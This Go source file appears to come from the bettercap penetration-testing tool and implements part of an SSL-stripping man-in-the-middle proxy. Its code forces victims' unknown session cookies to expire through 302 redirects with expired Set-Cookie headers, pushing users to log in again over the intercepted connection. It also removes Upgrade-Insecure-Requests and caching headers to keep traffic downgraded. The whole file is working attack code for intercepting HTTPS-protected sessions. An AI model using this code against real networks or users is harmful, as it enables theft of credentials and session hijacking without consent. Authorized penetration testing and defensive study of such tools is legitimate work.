package modules

import (
	"fmt"
	"net/http"
	"strings"
	"sync"

	"github.com/bettercap/bettercap/core"
	"github.com/bettercap/bettercap/log"

	"github.com/elazarl/goproxy"
	"github.com/jpillora/go-tld"
)

type cookieTracker struct {
	sync.RWMutex
	set map[string]bool
}

func NewCookieTracker() *cookieTracker {
	return &cookieTracker{
		set: make(map[string]bool),
	}
}

func (t *cookieTracker) domainOf(req *http.Request) string {
	if parsed, err := tld.Parse(req.Host); err != nil {
		log.Warning("Could not parse host %s: %s", req.Host, err)
		return req.Host
	} else {
		return parsed.Domain + "." + parsed.TLD
	}
}

func (t *cookieTracker) keyOf(req *http.Request) string {
	client := strings.Split(req.RemoteAddr, ":")[0]
	domain := t.domainOf(req)
	return fmt.Sprintf("%s-%s", client, domain)
}

func (t *cookieTracker) IsClean(req *http.Request) bool {
	t.RLock()
	defer t.RUnlock()

	// we only clean GET requests
	if req.Method != "GET" {
		return true
	}

	// does the request have any cookie?
	cookie := req.Header.Get("Cookie")
	if cookie == "" {
		return true
	}

	// was it already processed?
	if _, found := t.set[t.keyOf(req)]; found == true {
		return true
	}

	// unknown session cookie
	return false
}

func (t *cookieTracker) track(req *http.Request) {
	t.Lock()
	defer t.Unlock()
	t.set[t.keyOf(req)] = true
}

func (t *cookieTracker) TrackAndExpire(req *http.Request, ctx *goproxy.ProxyCtx) *http.Response {
	t.track(req)

	domain := t.domainOf(req)
	redir := goproxy.NewResponse(req, "text/plain", 302, "")

	for _, c := range req.Cookies() {
		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, domain))
		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, c.Domain))
	}

	redir.Header.Add("Location", req.URL.String())
	redir.Header.Add("Connection", "close")

	return redir
}

type SSLStripper struct {
	Enabled bool
	cookies *cookieTracker
}

func NewSSLStripper(enabled bool) *SSLStripper {
	return &SSLStripper{
		Enabled: enabled,
		cookies: NewCookieTracker(),
	}
}

// sslstrip preprocessing, takes care of:
//
// - patching / removing security related headers
// - making unknown session cookies expire
// - handling stripped domains
func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
	if s.Enabled == false {
		return
	}

	// preeprocess headers
	req.Header.Set("Pragma", "no-cache")
	for name, _ := range req.Header {
		if name == "Accept-Encoding" {
			req.Header.Del(name)
		} else if name == "If-None-Match" {
			req.Header.Del(name)
		} else if name == "If-Modified-Since" {
			req.Header.Del(name)
		} else if name == "Upgrade-Insecure-Requests" {
			req.Header.Del(name)
		}
	}

	// check if we need to redirect the user in order
	// to make unknown session cookies expire
	if s.cookies.IsClean(req) == false {
		log.Info("[%s] Sending expired cookies for %s to %s", core.Green("sslstrip"), core.Yellow(req.Host), req.RemoteAddr)
		redir = s.cookies.TrackAndExpire(req, ctx)
	}

	return
}
